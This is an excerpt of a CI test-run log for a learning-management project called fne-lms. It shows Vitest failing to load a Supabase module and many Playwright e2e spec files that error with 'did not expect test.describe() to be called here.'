2025-11-18T17:36:10.9384628Z     [90m240| [39m  });
2025-11-18T17:36:10.9385052Z     [90m241| [39m
2025-11-18T17:36:10.9385836Z     [90m242| [39m  const module = await import('../../pages/community/workspace.tsx');
2025-11-18T17:36:10.9386645Z     [90m   | [39m                 [31m^[39m
2025-11-18T17:36:10.9387737Z     [90m243| [39m  GroupAssignmentsContent = module.GroupAssignmentsContent;
2025-11-18T17:36:10.9388495Z     [90m244| [39m});
2025-11-18T17:36:10.9407194Z 
2025-11-18T17:36:10.9408484Z [31m[1mCaused by: Error[22m: Cannot find module '../../lib/supabase'
2025-11-18T17:36:10.9409947Z Require stack:
2025-11-18T17:36:10.9411509Z - /home/runner/work/fne-lms/fne-lms/components/__tests__/GroupAssignmentsContent.test.tsx[39m
2025-11-18T17:36:10.9413799Z [36m [2m❯[22m components/__tests__/GroupAssignmentsContent.test.tsx:[2m32:26[22m[39m
2025-11-18T17:36:10.9415593Z [90m [2m❯[22m components/__tests__/GroupAssignmentsContent.test.tsx:[2m242:18[22m[39m
2025-11-18T17:36:10.9417024Z 
2025-11-18T17:36:10.9419034Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:10.9421898Z [31m[1mSerialized Error:[22m[39m [90m{ code: 'MODULE_NOT_FOUND', requireStack: [ '/home/runner/work/fne-lms/fne-lms/components/__tests__/GroupAssignmentsContent.test.tsx' ] }[39m
2025-11-18T17:36:10.9424305Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[5/545]⎯[22m[39m
2025-11-18T17:36:10.9425350Z 
2025-11-18T17:36:10.9427471Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/admin-learning-paths-school-filter.spec.ts [2m[ e2e/tests/admin-learning-paths-school-filter.spec.ts ][22m
2025-11-18T17:36:10.9430973Z [31m[1mError[22m: Failed to load url ../helpers/test-utils (resolved id: ../helpers/test-utils) in /home/runner/work/fne-lms/fne-lms/e2e/tests/admin-learning-paths-school-filter.spec.ts. Does the file exist?[39m
2025-11-18T17:36:10.9434188Z [90m [2m❯[22m loadAndTransform node_modules/vite/dist/node/chunks/dep-827b23df.js:[2m55077:21[22m[39m
2025-11-18T17:36:10.9435604Z 
2025-11-18T17:36:10.9436709Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[6/545]⎯[22m[39m
2025-11-18T17:36:10.9438024Z 
2025-11-18T17:36:10.9439932Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/admin-learning-paths.spec.ts [2m[ e2e/tests/admin-learning-paths.spec.ts ][22m
2025-11-18T17:36:10.9442433Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9443919Z Most common reasons include:
2025-11-18T17:36:10.9445172Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9447684Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9448792Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9449993Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9451477Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9453022Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9454510Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9455746Z [36m [2m❯[22m e2e/tests/admin-learning-paths.spec.ts:[2m94:6[22m[39m
2025-11-18T17:36:10.9477495Z     [90m 92| [39m}
2025-11-18T17:36:10.9478322Z     [90m 93| [39m
2025-11-18T17:36:10.9479816Z     [90m 94| [39mtest.describe('Admin Learning Paths Management', () => {
2025-11-18T17:36:10.9480949Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9482339Z     [90m 95| [39m  test.beforeAll(async () => {
2025-11-18T17:36:10.9483621Z     [90m 96| [39m    console.log('Setting up test data for admin learning paths...');
2025-11-18T17:36:10.9484963Z 
2025-11-18T17:36:10.9485743Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[7/545]⎯[22m[39m
2025-11-18T17:36:10.9487033Z 
2025-11-18T17:36:10.9488113Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/auth.spec.ts [2m[ e2e/tests/auth.spec.ts ][22m
2025-11-18T17:36:10.9490173Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9491324Z Most common reasons include:
2025-11-18T17:36:10.9492708Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9494067Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9495889Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9498032Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9500275Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9503555Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9506607Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9508032Z [36m [2m❯[22m e2e/tests/auth.spec.ts:[2m9:6[22m[39m
2025-11-18T17:36:10.9509058Z     [90m  7| [39mimport { loginAs, logout, TEST_USERS, verifyRoleAccess } from '../util…
2025-11-18T17:36:10.9509836Z     [90m  8| [39m
2025-11-18T17:36:10.9510534Z     [90m  9| [39mtest.describe('Authentication Flow @auth', () => {
2025-11-18T17:36:10.9511319Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9511809Z     [90m 10| [39m  
2025-11-18T17:36:10.9512434Z     [90m 11| [39m  test.beforeEach(async ({ page }) => {
2025-11-18T17:36:10.9512829Z 
2025-11-18T17:36:10.9513267Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[8/545]⎯[22m[39m
2025-11-18T17:36:10.9513611Z 
2025-11-18T17:36:10.9514690Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/backward-compatibility.spec.ts [2m[ e2e/tests/backward-compatibility.spec.ts ][22m
2025-11-18T17:36:10.9538130Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9539472Z Most common reasons include:
2025-11-18T17:36:10.9540889Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9542286Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9544154Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9545677Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9548370Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9550427Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9552832Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9554568Z [36m [2m❯[22m e2e/tests/backward-compatibility.spec.ts:[2m15:6[22m[39m
2025-11-18T17:36:10.9556326Z     [90m 13| [39m} from '../utils/group-assignment-helpers';
2025-11-18T17:36:10.9557638Z     [90m 14| [39m
2025-11-18T17:36:10.9559271Z     [90m 15| [39mtest.describe('Legacy Auto-Grouping Compatibility @compatibility', () …
2025-11-18T17:36:10.9560578Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9582121Z     [90m 16| [39m  let testData: any;
2025-11-18T17:36:10.9582953Z     [90m 17| [39m
2025-11-18T17:36:10.9583782Z 
2025-11-18T17:36:10.9584421Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[9/545]⎯[22m[39m
2025-11-18T17:36:10.9585424Z 
2025-11-18T17:36:10.9586716Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/consultant-groups.spec.ts [2m[ e2e/tests/consultant-groups.spec.ts ][22m
2025-11-18T17:36:10.9589109Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9590253Z Most common reasons include:
2025-11-18T17:36:10.9591654Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9592954Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9594791Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9596319Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9599160Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9601267Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9603973Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9605638Z [36m [2m❯[22m e2e/tests/consultant-groups.spec.ts:[2m19:6[22m[39m
2025-11-18T17:36:10.9607602Z     [90m 17| [39m} from '../utils/group-assignment-helpers';
2025-11-18T17:36:10.9610434Z     [90m 18| [39m
2025-11-18T17:36:10.9615083Z     [90m 19| [39mtest.describe('Consultant Group Management @consultant', () => {
2025-11-18T17:36:10.9628392Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9629448Z     [90m 20| [39m  let testData: any;
2025-11-18T17:36:10.9630361Z     [90m 21| [39m
2025-11-18T17:36:10.9630718Z 
2025-11-18T17:36:10.9631960Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[10/545]⎯[22m[39m
2025-11-18T17:36:10.9632478Z 
2025-11-18T17:36:10.9633708Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/group-security.spec.ts [2m[ e2e/tests/group-security.spec.ts ][22m
2025-11-18T17:36:10.9635087Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9657176Z Most common reasons include:
2025-11-18T17:36:10.9658017Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9677942Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9706695Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9708189Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9709743Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9711430Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9713045Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9714340Z [36m [2m❯[22m e2e/tests/group-security.spec.ts:[2m15:6[22m[39m
2025-11-18T17:36:10.9715317Z     [90m 13| [39m} from '../utils/group-assignment-helpers';
2025-11-18T17:36:10.9716005Z     [90m 14| [39m
2025-11-18T17:36:10.9716980Z     [90m 15| [39mtest.describe('Group Management Security @security', () => {
2025-11-18T17:36:10.9717822Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9718478Z     [90m 16| [39m  let testData: any;
2025-11-18T17:36:10.9719060Z     [90m 17| [39m
2025-11-18T17:36:10.9719354Z 
2025-11-18T17:36:10.9727741Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[11/545]⎯[22m[39m
2025-11-18T17:36:10.9737353Z 
2025-11-18T17:36:10.9738442Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/rbac-production-ready.spec.ts [2m[ e2e/tests/rbac-production-ready.spec.ts ][22m
2025-11-18T17:36:10.9739872Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9740571Z Most common reasons include:
2025-11-18T17:36:10.9741172Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9742114Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9743129Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9744173Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9745601Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9747306Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9757694Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9759018Z [36m [2m❯[22m e2e/tests/rbac-production-ready.spec.ts:[2m72:6[22m[39m
2025-11-18T17:36:10.9761400Z     [90m 70| [39m}
2025-11-18T17:36:10.9763263Z     [90m 71| [39m
2025-11-18T17:36:10.9765356Z     [90m 72| [39mtest.describe('RBAC Production Readiness Tests', () => {
2025-11-18T17:36:10.9768056Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9770118Z     [90m 73| [39m  test.beforeAll(async () => {
2025-11-18T17:36:10.9772510Z     [90m 74| [39m    console.log('🧪 Starting RBAC production readiness test suite...');
2025-11-18T17:36:10.9774353Z 
2025-11-18T17:36:10.9775498Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[12/545]⎯[22m[39m
2025-11-18T17:36:10.9776030Z 
2025-11-18T17:36:10.9777182Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/rbac-system.spec.ts [2m[ e2e/tests/rbac-system.spec.ts ][22m
2025-11-18T17:36:10.9782679Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9783447Z Most common reasons include:
2025-11-18T17:36:10.9784110Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9785086Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9786122Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9787615Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9789162Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9790810Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9792613Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9793867Z [36m [2m❯[22m e2e/tests/rbac-system.spec.ts:[2m92:6[22m[39m
2025-11-18T17:36:10.9794480Z     [90m 90| [39m}
2025-11-18T17:36:10.9794871Z     [90m 91| [39m
2025-11-18T17:36:10.9795446Z     [90m 92| [39mtest.describe('RBAC System Tests', () => {
2025-11-18T17:36:10.9796056Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9796515Z     [90m 93| [39m
2025-11-18T17:36:10.9797353Z     [90m 94| [39m  test.describe.configure({ mode: 'serial' });
2025-11-18T17:36:10.9797777Z 
2025-11-18T17:36:10.9798187Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[13/545]⎯[22m[39m
2025-11-18T17:36:10.9798506Z 
2025-11-18T17:36:10.9799627Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/reports-analytics-minimal.spec.ts [2m[ e2e/tests/reports-analytics-minimal.spec.ts ][22m
2025-11-18T17:36:10.9801105Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9801802Z Most common reasons include:
2025-11-18T17:36:10.9802421Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9803358Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9804366Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9805453Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9807083Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9808650Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9810209Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9811581Z [36m [2m❯[22m e2e/tests/reports-analytics-minimal.spec.ts:[2m7:6[22m[39m
2025-11-18T17:36:10.9812663Z     [90m  5| [39m * Tests the critical user journey: login → reports → analytics tab → …
2025-11-18T17:36:10.9813379Z     [90m  6| [39m */
2025-11-18T17:36:10.9814224Z     [90m  7| [39mtest.describe('Learning Path Analytics Dashboard - Critical Path', () …
2025-11-18T17:36:10.9814996Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9815820Z     [90m  8| [39m  test('should load analytics dashboard and display components without…
2025-11-18T17:36:10.9816634Z     [90m  9| [39m    // Step 1: Login as admin user
2025-11-18T17:36:10.9817405Z 
2025-11-18T17:36:10.9817807Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[14/545]⎯[22m[39m
2025-11-18T17:36:10.9818116Z 
2025-11-18T17:36:10.9819144Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/reports-analytics-simple.spec.ts [2m[ e2e/tests/reports-analytics-simple.spec.ts ][22m
2025-11-18T17:36:10.9820520Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9821377Z Most common reasons include:
2025-11-18T17:36:10.9821979Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9822876Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9823846Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9824895Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9826256Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9828031Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9829491Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9830693Z [36m [2m❯[22m e2e/tests/reports-analytics-simple.spec.ts:[2m3:6[22m[39m
2025-11-18T17:36:10.9831562Z     [90m  1| [39mimport { test, expect } from '@playwright/test';
2025-11-18T17:36:10.9832112Z     [90m  2| [39m
2025-11-18T17:36:10.9832863Z     [90m  3| [39mtest.describe('Learning Path Analytics Dashboard - Basic Tests', () =>…
2025-11-18T17:36:10.9833591Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9834387Z     [90m  4| [39m  test('should successfully load analytics tab and display basic compo…
2025-11-18T17:36:10.9835210Z     [90m  5| [39m    // 1. Login as the existing admin user
2025-11-18T17:36:10.9835548Z 
2025-11-18T17:36:10.9835926Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[15/545]⎯[22m[39m
2025-11-18T17:36:10.9836242Z 
2025-11-18T17:36:10.9837363Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/reports-analytics.spec.ts [2m[ e2e/tests/reports-analytics.spec.ts ][22m
2025-11-18T17:36:10.9838715Z [31m[1mError[22m: Playwright Test did not expect test.beforeAll() to be called here.
2025-11-18T17:36:10.9839427Z Most common reasons include:
2025-11-18T17:36:10.9839980Z - You are calling test.beforeAll() in a configuration file.
2025-11-18T17:36:10.9840818Z - You are calling test.beforeAll() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9841807Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9842882Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9844263Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9845693Z [90m [2m❯[22m TestTypeImpl._hook node_modules/playwright/lib/common/testType.js:[2m159:24[22m[39m
2025-11-18T17:36:10.9848395Z [90m [2m❯[22m Function.beforeAll node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9849885Z [36m [2m❯[22m e2e/tests/reports-analytics.spec.ts:[2m240:6[22m[39m
2025-11-18T17:36:10.9850508Z     [90m238| [39m
2025-11-18T17:36:10.9851091Z     [90m239| [39m// Setup test data before all tests
2025-11-18T17:36:10.9851808Z     [90m240| [39mtest.beforeAll(async () => {
2025-11-18T17:36:10.9852409Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9853252Z     [90m241| [39m  console.log('Setting up test data for reports analytics...');
2025-11-18T17:36:10.9853994Z     [90m242| [39m  
2025-11-18T17:36:10.9854228Z 
2025-11-18T17:36:10.9854659Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[16/545]⎯[22m[39m
2025-11-18T17:36:10.9855003Z 
2025-11-18T17:36:10.9855835Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/student-groups.spec.ts [2m[ e2e/tests/student-groups.spec.ts ][22m
2025-11-18T17:36:10.9857434Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9858185Z Most common reasons include:
2025-11-18T17:36:10.9858821Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9859816Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9861095Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9862316Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9863859Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9865469Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9867235Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9868399Z [36m [2m❯[22m e2e/tests/student-groups.spec.ts:[2m17:6[22m[39m
2025-11-18T17:36:10.9869203Z     [90m 15| [39m} from '../utils/group-assignment-helpers';
2025-11-18T17:36:10.9869743Z     [90m 16| [39m
2025-11-18T17:36:10.9870477Z     [90m 17| [39mtest.describe('Student Group Assignment Experience @student', () => {
2025-11-18T17:36:10.9871209Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9871740Z     [90m 18| [39m  let testData: any;
2025-11-18T17:36:10.9872196Z     [90m 19| [39m
2025-11-18T17:36:10.9872385Z 
2025-11-18T17:36:10.9872759Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[17/545]⎯[22m[39m
2025-11-18T17:36:10.9873067Z 
2025-11-18T17:36:10.9873934Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/supervisor-basic.spec.ts [2m[ e2e/tests/supervisor-basic.spec.ts ][22m
2025-11-18T17:36:10.9875212Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9875892Z Most common reasons include:
2025-11-18T17:36:10.9876477Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9877563Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9878601Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9879717Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9881169Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9882691Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9884195Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9885385Z [36m [2m❯[22m e2e/tests/supervisor-basic.spec.ts:[2m9:6[22m[39m
2025-11-18T17:36:10.9886222Z     [90m  7| [39mimport { test, expect } from '@playwright/test';
2025-11-18T17:36:10.9886972Z     [90m  8| [39m
2025-11-18T17:36:10.9887975Z     [90m  9| [39mtest.describe('Supervisor de Red - Basic Integration', () => {
2025-11-18T17:36:10.9888693Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9889527Z     [90m 10| [39m  test('Application loads and login page is accessible', async ({ page…
2025-11-18T17:36:10.9890352Z     [90m 11| [39m    // Navigate to the application
2025-11-18T17:36:10.9890685Z 
2025-11-18T17:36:10.9891091Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[18/545]⎯[22m[39m
2025-11-18T17:36:10.9891418Z 
2025-11-18T17:36:10.9892473Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/supervisor-permissions.spec.ts [2m[ e2e/tests/supervisor-permissions.spec.ts ][22m
2025-11-18T17:36:10.9893901Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9894602Z Most common reasons include:
2025-11-18T17:36:10.9895211Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9896167Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9897372Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9898440Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9899816Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9901484Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9902948Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9904118Z [36m [2m❯[22m e2e/tests/supervisor-permissions.spec.ts:[2m9:6[22m[39m
2025-11-18T17:36:10.9905166Z     [90m  7| [39mimport { createSupervisorTestData, cleanupSupervisorTestData, Supervis…
2025-11-18T17:36:10.9905939Z     [90m  8| [39m
2025-11-18T17:36:10.9906694Z     [90m  9| [39mtest.describe('Supervisor de Red - Security & Permissions', () => {
2025-11-18T17:36:10.9907706Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9908404Z     [90m 10| [39m  let supervisorData: SupervisorTestData;
2025-11-18T17:36:10.9908984Z     [90m 11| [39m
2025-11-18T17:36:10.9909183Z 
2025-11-18T17:36:10.9909561Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[19/545]⎯[22m[39m
2025-11-18T17:36:10.9909888Z 
2025-11-18T17:36:10.9910790Z [31m[1m[7m FAIL [27m[22m[39m e2e/tests/supervisor_feature.spec.ts [2m[ e2e/tests/supervisor_feature.spec.ts ][22m
2025-11-18T17:36:10.9912258Z [31m[1mError[22m: Playwright Test did not expect test.describe() to be called here.
2025-11-18T17:36:10.9913032Z Most common reasons include:
2025-11-18T17:36:10.9913723Z - You are calling test.describe() in a configuration file.
2025-11-18T17:36:10.9914703Z - You are calling test.describe() in a file that is imported by the configuration file.
2025-11-18T17:36:10.9915764Z - You have two different versions of @playwright/test. This usually happens
2025-11-18T17:36:10.9917172Z   when one of the dependencies in your package.json depends on @playwright/test.[39m
2025-11-18T17:36:10.9918691Z [90m [2m❯[22m TestTypeImpl._currentSuite node_modules/playwright/lib/common/testType.js:[2m74:13[22m[39m
2025-11-18T17:36:10.9920296Z [90m [2m❯[22m TestTypeImpl._describe node_modules/playwright/lib/common/testType.js:[2m114:24[22m[39m
2025-11-18T17:36:10.9921890Z [90m [2m❯[22m Function.describe node_modules/playwright/lib/transform/transform.js:[2m275:12[22m[39m
2025-11-18T17:36:10.9923130Z [36m [2m❯[22m e2e/tests/supervisor_feature.spec.ts:[2m30:6[22m[39m
2025-11-18T17:36:10.9924008Z     [90m 28| [39mconst TEST_SCHOOLS = ['Los Pellines', 'San Rafael'];
2025-11-18T17:36:10.9924573Z     [90m 29| [39m
2025-11-18T17:36:10.9925216Z     [90m 30| [39mtest.describe('Supervisor de Red Feature', () => {
